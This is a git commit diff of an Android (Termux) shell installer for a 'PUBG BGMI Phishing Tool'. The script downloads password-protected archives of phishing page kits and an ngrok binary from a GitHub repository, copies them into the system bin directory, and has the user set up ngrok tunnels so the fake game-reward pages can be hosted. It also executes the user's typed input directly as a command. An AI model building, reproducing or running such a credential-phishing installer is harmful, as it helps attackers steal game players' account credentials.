4cddf91b3a37fd8395d64bb4af80638a7f060fc9
SUMAM MONDAL <63942767+Online-Hacking@users.noreply.github.com>
2021-09-14 13:45:03 +0530

    Update Android-Setup.sh

--- OnlineHacking/SUMAN/PUBG-BGMI/SM/OH/Android-Setup.sh
+++ OnlineHacking/SUMAN/PUBG-BGMI/SM/OH/Android-Setup.sh
@@ -2,6 +2,57 @@
 echo ""
 clear
 echo ""
+echo -e ""
+echo ""
+echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
+echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m  !!          Follow Step by Step         !!\e[0m'
+echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ---------------------------------------- \e[1;91m\e[0m'
+echo ""
+echo ""
+echo ""
+echo ""
+echo -e " \e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m \e[95m Use All Step Install Working \e[0m"
+echo ""
+echo ""
+echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 1 :\e[0m\e[1;36m Play Install & Use Video  "
+echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 2 :\e[0m\e[1;36m Enter Activation Key  "
+echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 3 :\e[0m\e[1;36m Download Requirement "
+echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 4 :\e[0m\e[1;36m Install Ngrok  "
+echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 5 :\e[0m\e[1;36m Download Tool File  "
+echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 6 :\e[0m\e[1;36m Enter The Ngrok Token  "
+echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 7 :\e[0m\e[1;36m Run Ngrok  "
+sleep 5
+clear
+echo ""
+echo ""
+echo -e "\e[1m \e[36m[+] There PUBG BGMI Phishing Tool Script for Android \e[m \e[21"
+echo ""
+echo ""
+echo ""
+echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
+echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m  !!       Welcome to Online HacKing      !!\e[0m'
+echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ---------------------------------------- \e[1;91m\e[0m'
+echo ""
+echo -e ""
+echo -e " \e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m \e[95m How To Install And Use This Tool Play Video \e[0m"
+echo ""
+echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Video Link :\e[0m\e[1;36m https://play.onlinehacking.xyz/  "
+echo ""
+echo ""
+echo ""
+read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Video Watching Complete ? \e[1;91m (Y/N) : \e[0m' option
+echo""
+echo""
+echo""
+if [[ $option == *'N'* ]]; then
+clear
+exit
+fi
+if [[ $option == *'n'* ]]; then
+clear
+exit
+fi
+clear
 echo ""
 echo -e " \e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m Installing The PUBG BGMI Phishing Tool Please Wait....  \e[0m"
 echo -e ""
@@ -12,12 +63,12 @@ echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   --------------------
 echo ""
 echo -e ""
 echo -e "\e[33m
-██╗  ██╗███████╗██╗   ██╗
-██║ ██╔╝██╔════╝╚██╗ ██╔╝
-█████╔╝ █████╗   ╚████╔╝
-██╔═██╗ ██╔══╝    ╚██╔╝
-██║  ██╗███████╗   ██║
-╚═╝  ╚═╝╚══════╝   ╚═╝    \e[0m\n"
+      ██╗  ██╗███████╗██╗   ██╗
+      ██║ ██╔╝██╔════╝╚██╗ ██╔╝
+      █████╔╝ █████╗   ╚████╔╝
+      ██╔═██╗ ██╔══╝    ╚██╔╝
+      ██║  ██╗███████╗   ██║
+      ╚═╝  ╚═╝╚══════╝   ╚═╝    \e[0m\n"
 echo ""
 echo ""
 echo -e " \e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m \e[95m Visit This Shot Link and Copy Activation Key \e[0m"
@@ -25,11 +76,11 @@ echo ""
 echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Link :\e[0m\e[1;36m https://bit.ly/3xgXUiT  "
 echo ""
 echo ""
-read -p $' \e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Enter Admin Activation Key : \e[0m' option
+read -p $' \e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Enter Activation Key : \e[0m' option
 echo""
 echo""
 echo""
-if [[ $option == *'4BMX25TWUVHE7HK7'* ]]; then
+if [[ $option == *''* ]]; then
 clear
 echo ""
 echo ""
@@ -42,8 +93,7 @@ echo ""
 echo -e "\e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m \e[95m Onine Hacking \e[0m"
 echo ""
 termux-setup-storage
-sudo apt-get install apache2 -y
-apt install 
+apt install apache2 -y 
 apt install ruby -y
 apt install php -y
 apt install jq -y
@@ -51,19 +101,70 @@ apt install tail -y
 apt install curl -y
 apt install zip -y
 apt install unrar -y
-apt install rar -y
 pkg install wget -y
 pkg install ruby -y
 pkg install gem -y
 gem install lolcat
 clear
-wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip --no-check-certificate
-unzip ngrok-stable-linux-arm.zip
+echo""
+echo -e "\e[1;96m========================================================= > > >\e[m "
+echo " "
+printf "\e[1;31m[\e[0m\e[1;92m01\e[0m\e[1;31m] \e[0m\e[1;37;44m Install Ngrok Old Version \e[0m \e[93m Customise  \e[0m  "  
+echo
+printf "\e[1;31m\e[0m\e[1;92m\e[0m\e[1;31m \e[0m\e[1;37;44m\e[0m"     
+echo
+printf "\e[1;31m[\e[0m\e[1;92m02\e[0m\e[1;31m] \e[0m\e[1;37;41m Install Ngrok Latest Version \e[0m   "  
+echo
+printf "\e[1;31m\e[0m\e[1;92m\e[0m\e[1;31m \e[0m\e[1;37;44m\e[0m"
+echo " "
+echo -e "\e[1;96m========================================================= > > >\e[m "
+echo ""
+echo ""
+read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m You Want to Choose Ngrok Version : \e[1;91m (default:1) : \e[0m' option
+echo""
+echo""
+echo""
+if [[ $option == *'1'* ]]; then
+wget https://github.com/Online-Hacking/Mr-OnlineHacking/raw/main/Ngrok/Ngrok%20Old/ngrok
+fi
+if [[ $option == *'2'* ]]; then
+wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip
+unzip ngrok-stable-linux-386.zip
+fi
+echo""
+clear
+echo ""
+echo ""
+echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
+echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!          DOWNLOAD TOOL FILE          !!\e[0m'
+echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
+echo ""
 wget https://github.com/Online-Hacking/Mr-OnlineHacking/raw/main/OnlineHacking/SUMAN/PUBG-BGMI/SUMAN-PUBG.rar
 wget https://github.com/Online-Hacking/Mr-OnlineHacking/raw/main/OnlineHacking/SUMAN/PUBG-BGMI/SUMAN-BGMI.rar
 unrar x -Password SUMAN-PUBG.rar
 unrar x -Password SUMAN-BGMI.rar
-rm -rf ngrok-stable-linux-arm.zip  SUMAN-PUBG.rar SUMAN-BGMI.rar
+rm -rf SUMAN-PUBG.rar SUMAN-BGMI.rar
+chmod +x ngrok
+chmod +x PUBG
+chmod +x BGMI
+chmod +x Run-Ngrok
+clear
+echo ""
+echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
+echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!        Requirement Ngrok Token       !!\e[0m'
+echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
+echo ""
+echo""
+echo -e "\e[31m[\e[32m*\e[31m]\e[33m Visit \e[32mngrok.com \e[m "
+echo ""
+echo -e "\e[31m[\e[32m*\e[31m]\e[33m Sign up & get ngrok authtoken \e[m "
+echo ""
+sleep 1
+echo ""
+read -p $'\e[31m[\e[32m*\e[31m]\e[33m Enter The Ngrok Token [Ex. ./ngrok authtoken 1Y7IU ] : \e[0m' token
+$token
+sleep1
+echo
 cp -R ngrok SUMAN/Collect-EVENT-LINE/
 cp -R ngrok SUMAN/Collect-MC-Larent-Car/
 cp -R ngrok SUMAN/Lucky-Spin-Godzila-S19/
@@ -74,25 +175,25 @@ cp -R ngrok SUMAN1/COLLECT-S19-ID/
 cp -R ngrok SUMAN1/Godzilla-LuckySpin/
 cp -R ngrok SUMAN1/RPS19-COLLECT/
 cp -R ngrok SUMAN1/X-Suit-LuckySpin/
-chmod 7777 OnlineHacking-Phishing
+chmod 7777 PUBG-BGMI_Phishing
 clear
-echo ""
-echo -e "\e[31m[\e[32m*\e[31m]\e[33m Visit \e[32mngrok.com \e[m "
-echo ""
-echo -e "\e[31m[\e[32m*\e[31m]\e[33m Sign up & get ngrok authtoken \e[m "
-echo ""
-sleep 1
-echo ""
-read -p $'\e[31m[\e[32m*\e[31m]\e[33m Enter The Ngrok Token [Ex. ./ngrok authtoken 1Y7IU ] : \e[0m' token
-$token
-sleep2
 echo
 clear
 echo
 echo
+cp -R ngrok /data/data/com.termux/files/usr/bin
+cp -R SUMAN /data/data/com.termux/files/usr/bin
+cp -R SUMAN1 /data/data/com.termux/files/usr/bin
+cp -R PUBG /data/data/com.termux/files/usr/bin
+cp -R BGMI /data/data/com.termux/files/usr/bin
+cp -R PUBG-BGMI_Phishing /data/data/com.termux/files/usr/bin
+cp -R Run-Ngrok /data/data/com.termux/files/usr/bin
+cp -R OnlineHacking /data/data/com.termux/files/usr/bin
+echo
+rm -rf SUMAN SUMAN1 PUBG-BGMI_Phishing 
 echo
 echo -e "\e[35m[+] Connect Online Hacking PUBG BGMI Hacking Server......  \e[m "
-sleep 4
+sleep 2
 echo
 echo
 clear
@@ -101,10 +202,10 @@ echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m !!    Installation Suc
 echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;96m\e[0m\e[1;92m  ---------------------------------   \e[1;91m\e[0m'
 sleep 4
 echo
-echo -e "\e[1m \e[36m[+] There PUBG BGMI Phishing Tool Script for Android \e[m \e[21"
+echo -e "\e[1m \e[36m[+] This is Last Step \e[m \e[21"
 echo
 echo
-echo -e "\e[92m[+] To Run the Tool type :\e[93m ./OnlineHacking-Phishing \e[m "
+echo -e "\e[92m[+] Open New type this command:\e[93m PUBG-BGMI_Phishing \e[m "
 echo
 fi
 sleep 3
